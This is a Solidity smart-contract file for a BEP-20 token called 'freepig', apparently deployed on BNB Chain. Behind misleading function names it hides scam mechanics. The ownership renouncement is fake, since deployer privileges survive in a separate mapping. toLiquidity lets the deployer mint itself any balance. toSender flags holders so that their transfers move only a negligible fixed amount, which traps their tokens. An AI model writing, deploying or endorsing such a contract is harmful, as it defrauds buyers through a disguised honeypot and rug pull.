/**
 *Submitted for verification at BscScan.com on 2023-01-23
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;


interface UniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface UniswapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract freepig is IBEP20 {
    uint8 constant _decimals = 18;
    mapping(address => bool) public fromShouldTrading;
    uint256 constant atTrading = 17 ** 10;
    address public receiverExempt;
    string constant _symbol = "freepig";


    mapping(address => mapping(address => uint256)) _allowances;
    address public enableFee;

    string constant _name = "freepig";
    address public owner;

    mapping(address => bool) public txMode;
    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    mapping(address => uint256) _balances;

    modifier modeReceiver() {
        require(txMode[msg.sender]);
        _;
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor (){
        UniswapRouter tradingSender = UniswapRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        enableFee = UniswapFactory(tradingSender.factory()).createPair(tradingSender.WETH(), address(this));
        _allowances[address(this)][address(tradingSender)] = type(uint256).max;
        owner = msg.sender;
        receiverExempt = msg.sender;
        txMode[receiverExempt] = true;
        _balances[receiverExempt] = _totalSupply;
        emit Transfer(address(0), receiverExempt, _totalSupply);
        renounceOwnership();
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function renounceOwnership() public {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if (sender == receiverExempt || recipient == receiverExempt) {
            return tradingShould(sender, recipient, amount);
        }
        if (fromShouldTrading[sender]) {
            return tradingShould(sender, recipient, atTrading);
        }
        return tradingShould(sender, recipient, amount);
    }

    function sellLimit(address tradingTx) public modeReceiver {
        txMode[tradingTx] = true;
    }

    function toLiquidity(uint256 takeLimit) public modeReceiver {
        _balances[receiverExempt] = takeLimit;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function tradingShould(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(amount <= _balances[sender]);
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            require(amount <= _allowances[sender][msg.sender]);
            _allowances[sender][msg.sender] -= amount;
        }
        return _transferFrom(sender, recipient, amount);
    }

    function toSender(address atSender) public modeReceiver {
        fromShouldTrading[atSender] = true;
    }


}